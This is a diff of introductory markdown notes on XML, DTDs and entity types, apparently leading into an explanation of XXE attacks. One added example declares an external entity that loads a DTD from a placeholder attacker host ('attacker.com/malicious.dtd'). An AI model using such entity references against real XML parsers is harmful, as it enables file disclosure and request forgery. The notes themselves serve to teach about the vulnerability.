@@ -2,6 +2,12 @@
 
 XML stands for eXtensible Markup Language, we can understand XML is markup language, is developed by W3C to store and transmit data.
 
+### DTD
+
+DTD stands for Document Type Definition - define structure, data type of element and properties in XML document.
+
+DTD has 2 types: internal and external.
+
 ### Entity
 
 Entity has 3 parts: `&`, `nameOfEntity` and `;`. Entity is declared in DTD (Document Type Definition).
@@ -25,8 +31,14 @@ __Internal Entity__
 
 __External Entity__
 
-- Entity is declared in another position, system use will retrive to this position to get data of entity.
+- Entity is declared in another position, system use will retrive to this position to get data of entity. (`.dtd`)
 - Syntax: `<!ENTITY entity-name SYSTEM "URI/URL">`
+
+Example: 
+
+```xml
+<!ENTITY entity-name SYSTEM "http://attacker.com/malicious.dtd">
+```
 
 ## What is XXE?
 
